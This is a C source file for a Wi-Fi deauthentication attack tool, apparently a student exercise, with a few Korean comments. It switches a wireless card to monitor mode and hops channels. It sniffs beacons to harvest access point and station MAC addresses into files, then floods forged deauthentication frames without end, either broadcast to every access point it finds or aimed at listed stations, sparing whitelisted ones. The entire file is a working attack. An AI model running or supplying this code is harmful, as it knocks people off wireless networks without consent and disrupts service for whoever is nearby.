#include <pthread.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "beacon.cpp"

#define MAC_ALEN 6
#define MAC_ADDR_STR_LEN 17

int death_Particular_flag = 0, death_all_flag = 0, death_ap_flag = 0, death_stationList_flag = 0, death_whiteList_flag = 0;

void usage(){
        printf("syntax: deauth-attack-whitelist <interface> -ap <ap mac> -stationList <station_mac_list> -whiteList <white_list>\n");
        printf("sample: deauth-attack-whitelist wlan0 -ap AA:BB:CC:DD:EE:FF -stationList station_mac.txt -whiteList white_list.txt  \n");
}

void init_setting(int argc, char* argv[]){
    for(int i=1; i < argc; i++){
        if(strcmp(argv[i],"--all")==0) death_all_flag = i;
        if(strcmp(argv[i], "-apList")==0) death_Particular_flag = i;
        if(strcmp(argv[i], "-ap")==0) death_ap_flag = i;
        if(strcmp(argv[i], "-stationList")==0) death_stationList_flag = i;
        if(strcmp(argv[i], "-whiteList")==0) death_whiteList_flag = i;
    }
}

void monitor(char * dev){ // 랜카드 모니터 모드로 변경 함수
    if(strlen(dev)>30){
        printf("interface name length less than 30 characters");
        exit(-1);
    }
    char command[100];
    sprintf(command, "ifconfig %s down",dev);
    system(command);
    sprintf(command, "iwconfig %s mode monitor",dev);
    system(command);
    sprintf(command, "ifconfig %s up",dev);
    system(command);
}

bool ConvertMacAddrStr2Array(const char *mac_addr_str, uint8_t mac_addr[MAC_ALEN]){
    int res, i ,val;
    char temp[MAC_ADDR_STR_LEN+1];
    if(strlen(mac_addr_str) != MAC_ADDR_STR_LEN) return true;
    memcpy(temp, mac_addr_str, MAC_ADDR_STR_LEN);
    temp[MAC_ADDR_STR_LEN] = 0x00;
    for(i = 0; i < MAC_ALEN; i++){
        temp[(3*i)+2] = '\0';
        res = sscanf((const char *)&temp[3*i], "%x", &val);
        if(res==0) return true;
        mac_addr[i] = (char)val;
    }
    return false;
}

int set_bssid(FILE* pFile, char * bssid){
    char strTemp[20]= {0,};
    if(!feof(pFile)) fgets(strTemp, sizeof(strTemp),pFile);
    else fseek(pFile,0,SEEK_SET);
    if (strlen(strTemp) == 0){
        fseek(pFile,0,SEEK_SET);
        return -1;
    }
    if (strTemp[strlen(strTemp)-1] == 0x0d) strTemp[strlen(strTemp)-1] = 0x00;
    if (strTemp[strlen(strTemp)-1] == 0x0a) strTemp[strlen(strTemp)-1] = 0x00;
    memcpy(bssid, strTemp, 20);
    return 0;
}

int check_mac_list(FILE* pFile, char *mac){
    char strTemp[20] = {0,};
    while(!feof(pFile)){
        fgets(strTemp, sizeof(strTemp),pFile);
        if(strcmp(mac, strTemp)==0){
            return 1;
        }
    }
    return 0;
}

void* thread_channel(void * dev){   //모든 채널의 와이파이 패킷을 받기 위해 3초마다 채널을 변경
    int cnt = 1;
    while(1){
            char command[100];
            if (cnt>13) cnt=1;
            sprintf(command, "iwconfig %s ch %d", (char *)dev, cnt);
            system(command);
            printf(" [*] Channel Change : %d\n",cnt++);
            sleep(3);
    }
    printf("Thread 3 Die!!\n");
}

void *ap_mac(void *dev) {
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* pcap2 = pcap_open_live((char *)dev , BUFSIZ, 1, 1000, errbuf);
    if (pcap2 == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", (char *)dev, errbuf);
        exit(0);
    }

    while (1) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        unsigned int radiotap_len;
        unsigned char *smac = NULL;

        int res = pcap_next_ex(pcap2, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap2));
            break;
        }

        radiotap_len = dump_radiotap((struct radiotap_header *)packet);
        packet += radiotap_len;
        smac = dump_beacon_header((struct IEEE_802dot11 *)packet);

        if (smac != NULL){
            char mac[20];
            char strTemp2[20];
            int flag=0;

            sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x\n",smac[0], smac[1], smac[2], smac[3], smac[4], smac[5]);
            //printf("mac : %s\n",mac);

            FILE* pFile = fopen("ap_mac.txt", "rb");
            if (pFile == NULL){
                printf("File not Found 1!\n");
                exit(0);
            }
            while(!feof(pFile)){
                fgets(strTemp2, sizeof(strTemp2),pFile);
                if(strcmp(mac, strTemp2)==0){
                    flag = 1;
                    break;
                }

            }
            fclose(pFile);

            if(flag == 0){
                FILE* pFile2 = fopen("ap_mac.txt", "ab");
                if (pFile2 == NULL){
                    printf("File not Found 2!\n");
                    exit(0);
                }
                if(fputs(mac, pFile2) != EOF){
                    //printf("ADD MAC ADDR : %s\n", mac);
                    fseek(pFile,0,SEEK_SET);
                }
                fclose(pFile2);
            }
        }

        usleep(10);
    }
    pcap_close(pcap2);
    printf("Thread 2 Die!!\n");
}

void *station_mac(void *arg) {
    struct multiargs *data = (struct multiargs *)arg;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap2 = pcap_open_live((char *)data->dev , BUFSIZ, 1, 1000, errbuf);
    if (pcap2 == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", (char *)data->dev, errbuf);
        exit(0);
    }

    while (1) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        unsigned int radiotap_len;
        unsigned char *smac = NULL;

        int res = pcap_next_ex(pcap2, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap2));
            break;
        }
        radiotap_len = dump_radiotap((struct radiotap_header *)packet);
        packet += radiotap_len;
        smac = dump_beacon_header((struct IEEE_802dot11 *)packet);
        if (smac == NULL) continue;
        
        char mac[20] = {0,};
        int flag =0;

        sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x\n",smac[0], smac[1], smac[2], smac[3], smac[4], smac[5]);

        FILE* pFile = fopen((char *)data->station_mac_list, "rb");
        if (pFile == NULL){
            printf("File(station_mac_list) not Found (thread2)\n");
            exit(0);
        }
        flag = check_mac_list(pFile, mac);
        fclose(pFile);
        

        FILE* pFile3 = fopen((char *)data->white_list, "rb");
        if (pFile3 == NULL){
            printf("File(station_mac_list) not Found (thread2)\n");
            exit(0);
        }
        flag = check_mac_list(pFile3, mac);
        fclose(pFile3);


        if(flag == 0){
            FILE* pFile2 = fopen((char *)data->station_mac_list, "ab");
            if (pFile2 == NULL){
                printf("File(station_mac_list) not Found (thread2)\n");
                exit(0);
            }
            if(fputs(mac, pFile2) != EOF){
                //printf("ADD MAC ADDR : %s\n", mac);
                fseek(pFile,0,SEEK_SET);
            }
            fclose(pFile2);
        }
        usleep(10);
    }
    pcap_close(pcap2);
    printf("Thread 2 Die!!\n");
}




int main(int argc, char* argv[]) {
    init_setting(argc, argv);

    int type = 0;
    if(argc==4) type = 1;
    else if(argc==8) type = 2;
    else if(argc==3) type = 3;
    if (type == 0){
        usage();
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    char * dev = argv[1];
    int num=0;
    uint8_t macAddr[MAC_ALEN];
    char *ap_macAddr, *stationFile;
    FILE* pFile;

    monitor(dev);

    //가짜 비콘 프레임 1 생성/초기화
    struct beacon_frame beacon_a2s;
    struct beacon_frame beacon_s2a;

    //if(death_Particular_flag != 0) char * ap_list = argv[death_Particular_flag + 1];
    //if(death_whiteList_flag != 0) char * whiteFile = argv[death_whiteList_flag + 1];
    //if(death_all_flag != 0) char * ap_list = argv[death_all_flag + 1];

    if (type==2){
        ap_macAddr = argv[death_ap_flag + 1];
        stationFile = argv[death_stationList_flag + 1];
        struct multiargs multiarg;
        multiarg.dev = argv[1];
        multiarg.station_mac_list = argv[death_stationList_flag + 1];
        multiarg.white_list = argv[death_whiteList_flag + 1];
        pthread_t thread;
        pthread_create(&thread, 0, station_mac, (void *)&multiarg);
        pFile = fopen(stationFile, "rb");
        if (pFile == NULL){
            printf("File not Found!\n");
            exit(0);
        }

        if (ConvertMacAddrStr2Array(ap_macAddr, macAddr)){
            printf("Fail to convert MAC address 1\n");
            return -1;
        }
        memcpy(beacon_a2s.becon.shost, macAddr, 6);
        memcpy(beacon_a2s.becon.bssid, macAddr, 6);
        memcpy(beacon_s2a.becon.dhost, macAddr, 6);

    } else if(type==3){
        FILE* pFile = fopen("ap_mac.txt", "wb"); //Create 'ap_mac.txt' File!
        fclose(pFile);

        pthread_t thread;
        pthread_create(&thread, 0, ap_mac, (void *) dev);
        pthread_t thread2;
        pthread_create(&thread2, 0, thread_channel, (void *) dev);

        pFile = fopen("ap_mac.txt", "rb");

        memset(beacon_a2s.becon.dhost,0xff,sizeof(uint8_t)*6);
    }


    pcap_t* pcap = pcap_open_live(dev , BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    while (1) {
        char strTemp[20] = {0,};
        char shost[20] = {0,};
        char dhost[20] = {0,};
        if (set_bssid(pFile, strTemp) == -1) continue;
        
        if (ConvertMacAddrStr2Array(strTemp, macAddr)){
            printf("Fail to convert MAC address 2\n");
            return -1;
        }
        
        if (type==2){
            memcpy(beacon_a2s.becon.dhost, macAddr, 6);
            memcpy(beacon_s2a.becon.shost, macAddr, 6);
            memcpy(beacon_s2a.becon.bssid, macAddr, 6);
            if (pcap_sendpacket(pcap, (unsigned char*)&beacon_s2a, sizeof(beacon_s2a)) != 0){
                printf("Fail sendpacket 2\n");
                exit (-1);
            }
            usleep(10);
        }else if(type==3){
            memcpy(beacon_a2s.becon.shost, macAddr, 6);
            memcpy(beacon_a2s.becon.bssid, macAddr, 6);
        }

        if (pcap_sendpacket(pcap, (unsigned char*)&beacon_a2s, sizeof(beacon_a2s)) != 0){
            printf("Fail sendpacket 1\n");
            exit (-1);
        }
        
        sprintf(shost, "%02x:%02x:%02x:%02x:%02x:%02x", beacon_a2s.becon.shost[0],beacon_a2s.becon.shost[1],beacon_a2s.becon.shost[2] ,beacon_a2s.becon.shost[3],beacon_a2s.becon.shost[4],beacon_a2s.becon.shost[5]);
        sprintf(dhost, "%02x:%02x:%02x:%02x:%02x:%02x", beacon_a2s.becon.dhost[0],beacon_a2s.becon.dhost[1],beacon_a2s.becon.dhost[2] ,beacon_a2s.becon.dhost[3],beacon_a2s.becon.dhost[4],beacon_a2s.becon.dhost[5]);

        printf("%5d | [AP] %s <-> [station] %s | Deauth Packet!\n", ++num, shost, dhost);
        usleep(1000);
    }
    fclose(pFile);
    pcap_close(pcap);
}
